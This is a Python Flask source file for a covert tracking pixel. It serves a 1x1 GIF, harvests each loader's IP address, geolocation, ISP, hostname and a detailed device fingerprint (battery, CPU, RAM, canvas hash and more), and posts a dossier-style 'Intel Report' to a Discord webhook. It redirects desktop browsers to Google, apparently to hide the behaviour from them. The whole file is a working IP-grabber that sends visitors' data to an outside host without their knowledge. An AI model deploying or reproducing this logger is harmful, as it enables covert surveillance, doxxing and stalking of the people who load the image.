import os
from flask import Flask, request, send_file, redirect
import requests
from datetime import datetime
import io
import json
import socket

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
ABUSEIPDB_KEY = os.environ.get('ABUSEIPDB_KEY')

# 1x1 pixel ki transparent GIF image
PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

@app.route('/assets/tracker.gif')
def track():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    if 'Windows' in user_agent or 'Macintosh' in user_agent or ('Linux' in user_agent and 'Android' not in user_agent):
        return redirect("https://www.google.com", code=302)

    if not DISCORD_WEBHOOK_URL:
        return "Error: Discord Webhook URL not configured.", 500

    # --- Step 1: Data Capture ---
    raw_ip_list = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_address = raw_ip_list.split(',')[0].strip()
    # (Baaki saara data capture karna waisa hi hai)
    username = request.args.get('username', 'Guest')
    avatar_url = request.args.get('avatar', '')
    user_message = request.args.get('message', 'N/A')
    visitor_type = "Returning ♻️" if request.args.get('isNew') == 'false' else "New ✨"
    screen_res, os_type, browser, cpu_cores, ram, battery_level, is_charging, is_touch, timezone, languages, ad_blocker, network_speed, canvas_hash, referrer = [request.args.get(k, 'N/A') for k in ['screen', 'os', 'browser', 'cpu', 'ram', 'battery_level', 'charging_status', 'touch', 'timezone', 'langs', 'adBlock', 'speed', 'canvas']] + [request.headers.get('Referer', 'Direct Visit')]
    is_touch = 'Yes' if is_touch == 'true' else 'No'
    ad_blocker_status = 'Detected 🛡️' if ad_blocker == 'true' else 'Not Detected 🟢'
    
    # --- Step 2: Deep IP Intelligence with NEW Geolocation Provider ---
    geo_info, asn_info, hostname, threat_level, risk_color = "Lookup Failed", "Lookup Failed", "Lookup Failed", "Low ✅", 3066993 # Default to Green
    abuse_score = 0
    
    # Geolocation, ASN using ip-api.com
    try:
        # NEW: Using ip-api.com
        response_geo = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,city,isp,as,query", timeout=5)
        if response_geo.status_code == 200:
            data = response_geo.json()
            if data.get('status') == 'success':
                city, country_code, isp, asn_str = data.get('city', 'N/A'), data.get('countryCode', 'N/A'), data.get('isp', 'N/A'), data.get('as', 'N/A')
                flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
                geo_info = f"{flag_emoji} {city}, {country_code}"
                asn_info = f"{isp}\n({asn_str})"
                if any(word in asn_info.lower() for word in ['vpn', 'proxy', 'hosting', 'datacenter']):
                    threat_level = "Medium 🟨 (VPN/Proxy Host)"
                    risk_color = 15844367 # Yellow
    except requests.exceptions.Timeout:
        print(f"ERROR: ip-api.com request timed out for IP {ip_address}")
        geo_info = "Timeout"
    except Exception as e:
        print(f"ERROR: ip-api.com lookup failed for IP {ip_address}: {e}")

    # Hostname
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except Exception:
        hostname = "Not Found"

    # IP Reputation (AbuseIPDB)
    if ABUSEIPDB_KEY:
        try:
            response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'}, timeout=5)
            if response_abuse.status_code == 200:
                data = response_abuse.json()['data']
                abuse_score = data.get('abuseConfidenceScore', 0)
                if data.get('isTor'): threat_level, risk_color = "Critical 🚨 (Tor Exit Node)", 15158332
                elif abuse_score > 75: threat_level, risk_color = f"High 🟥 ({abuse_score}% Abuse Score)", 15158332
                elif abuse_score > 25 and risk_color != 15158332: threat_level, risk_color = f"Medium 🟨 ({abuse_score}% Abuse Score)", 15844367
        except Exception as e:
            print(f"ERROR: AbuseIPDB lookup failed: {e}")
    else:
        abuse_score = "API Key Missing"

    # --- Step 3: THE "INTELLIGENCE BRIEFING" EMBED ---
    embed = {
        "author": { "name": f"Holland Intel Report: {visitor_type} Visitor", "icon_url": "https://i.imgur.com/M6yB8oA.png" },
        "description": f"**Subject:** `{username}`\n"
                       f"**IP Address:** `{ip_address}`\n"
                       f"**Threat Assessment:** **{threat_level}**",
        "color": risk_color, "thumbnail": { "url": avatar_url },
        "fields": [
            { "name": "📍 Location", "value": f"`{geo_info}`", "inline": True },
            { "name": "🏢 Network Operator", "value": f"`{asn_info}`", "inline": True },
            { "name": "🛡️ Abuse Score", "value": f"`{abuse_score}%`", "inline": True },
            { "name": "💻 Client Profile", "value": f"**OS:** `{os_type}`\n**Browser:** `{browser}`\n**Screen:** `{screen_res}`", "inline": True },
            { "name": "⚙️ Hardware & Network", "value": f"**CPU/RAM:** `{cpu_cores}c` / `{ram}GB`\n**Speed:** `{network_speed} Mbps`\n**Battery:** `{battery_level}` (`{is_charging}`)", "inline": True },
            { "name": "💬 User Message", "value": f"> {user_message}" if user_message != 'N/A' else "> No message left.", "inline": False },
        ],
        "footer": { "text": f"Canvas: {canvas_hash} | Hostname: {hostname} | Logged: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC" }
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Error sending to Discord: {e}")

    return send_file(io.BytesIO(PIXEL_BYTES), mimetype='image/gif')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
